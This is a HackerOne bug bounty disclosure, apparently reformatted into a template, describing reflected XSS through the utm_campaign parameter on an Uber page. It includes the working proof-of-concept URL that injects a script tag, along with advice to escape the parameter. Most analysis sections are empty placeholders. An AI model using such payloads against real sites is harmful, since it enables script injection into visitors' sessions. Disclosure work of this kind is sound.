# XSS in getrush.uber.com 

## Metadata
- **Source:** HackerOne
- **Report:** 125112 | https://hackerone.com/reports/125112
- **Submitted:** 2016-03-22
- **Reporter:** ddworken
- **Program:** Unknown
- **Bounty:** $3,000
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
'' 'https://getrush.uber.com/business?utm_campaign=tttttt%27%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E&utm_medium=top&utm_source=website'''

You need to escape the utm_campaign parameter before rendering it in the HTML. 

Thanks, 
David Dworken 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

'' 'https://getrush.uber.com/business?utm_campaign=tttttt%27%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E&utm_medium=top&utm_source=website'''

You need to escape the utm_campaign parameter before rendering it in the HTML. 

Thanks, 
David Dworken 

</details>

---
*Analysed by Claude on 2026-05-24*
